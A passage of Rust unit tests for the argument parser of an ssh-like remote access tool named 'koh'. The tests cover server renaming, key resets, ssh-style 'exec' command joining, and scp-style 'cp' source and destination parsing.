        let Cmd::Names { op, .. } = parsed(&["koh", "servers", "rename", "a", "b"]) else {
            panic!("servers rename");
        };
        assert_eq!(
            op,
            Op::Rename {
                old: "a".to_owned(),
                new: "b".to_owned()
            }
        );
        assert!(command()
            .try_get_matches_from(["koh", "servers", "add", "-x", ID])
            .is_err());
    }

    #[test]
    fn key_reset_names_the_key_and_defaults_to_the_client_one() {
        let Cmd::Key(c) = parsed(&["koh", "key", "reset", "server", "--yes"]) else {
            panic!("key reset");
        };
        assert_eq!((c.role, c.role_named), ("server", true));
        let Cmd::Key(c) = parsed(&["koh", "key", "reset", "--yes"]) else {
            panic!("key reset");
        };
        assert_eq!((c.role, c.role_named), ("client", false));
        assert!(
            command()
                .try_get_matches_from(["koh", "key", "reset", "server", "--key-file", "/k"])
                .is_err(),
            "a named key and a key file at once"
        );
    }

    /// `koh exec` takes its command as ssh does, the words joined; `koh cp` reads `SERVER:PATH` as
    /// scp does, one side the server's, and takes scp's `-r` and `-p` as what it always does.
    #[test]
    fn exec_and_cp_read_their_arguments_as_ssh_and_scp_do() {
        use koh::client::CopyJob;
        use std::path::PathBuf;
        let Cmd::Exec { remote, line } = parsed(&[
            "koh",
            "exec",
            "laptop",
            "--direct",
            "127.0.0.1:9",
            "ls",
            "-la",
            "a b",
        ]) else {
            panic!("exec");
        };
        assert_eq!(line.as_bytes(), b"ls -la a b");
        assert!(remote.direct.is_some());
        let Cmd::Exec { line, .. } = parsed(&["koh", "exec", ID, "--", "--version"]) else {
            panic!("exec --");
        };
        assert_eq!(line.as_bytes(), b"--version");
        let copy = |argv: &[&str]| {
            let Cmd::Copy { remote, job } = parsed(&[&["koh", "cp"][..], argv].concat()) else {
                panic!("cp {argv:?}");
            };
            (remote.server, job)
        };
        let (server, job) = copy(&["-r", "-p", "a", "./b:c", "laptop:~/x"]);
        assert_eq!(server, super::ServerRef::Name("laptop".to_owned()));
        let CopyJob::Put { sources, dest } = job else {
            panic!("put");
        };
        assert_eq!(sources, [PathBuf::from("a"), PathBuf::from("./b:c")]);
        assert_eq!(dest.as_bytes(), b"~/x");
        let (_, job) = copy(&[&format!("{ID}:/etc/hosts"), &format!("{ID}:"), "."]);
        let CopyJob::Get { sources, dest } = job else {
            panic!("get");
        };
        let paths: Vec<&[u8]> = sources
            .paths()
            .iter()
            .map(koh::request::RemotePath::as_bytes)
            .collect();
        assert_eq!(paths, [&b"/etc/hosts"[..], b""]);
        assert_eq!(dest, PathBuf::from("."));
        // Both sides here, both there, or two servers: refused.
        for argv in [
            &["koh", "cp", "a", "b"][..],
            &["koh", "cp", "laptop:a", "laptop:b"],
            &["koh", "cp", "laptop:a", "phone:b"],
            &["koh", "cp", "phone:a", "laptop:b", "here"],
        ] {
            let error = command()
                .try_get_matches_from(argv)
                .map_err(|e| e.kind())
                .and_then(|m| parse(&m).map_err(|e| e.kind()));
            assert!(error.is_err(), "{argv:?}");
        }
    }

    #[test]
    fn koh_alone_is_the_menu() {
        assert!(matches!(parsed(&["koh"]), Cmd::Menu));
    }

    #[test]
    fn the_key_file_is_global_to_key() {
        for argv in [
            ["koh", "key", "--key-file", "/k", "reset", "--yes"],
            ["koh", "key", "reset", "--key-file", "/k", "--yes"],
        ] {
            let Cmd::Key(c) = parsed(&argv) else {
                panic!("key");
            };
            assert!(matches!(c.op, KeyOp::Reset { confirmed: true }), "{argv:?}");
            assert_eq!(
                c.key_file.as_deref(),
                Some(std::path::Path::new("/k")),
                "{argv:?}"
            );
        }
        let Cmd::Key(c) = parsed(&["koh", "key", "info"]) else {
            panic!("key");
        };
        assert!(matches!(c.op, KeyOp::Info) && c.key_file.is_none());
    }
}
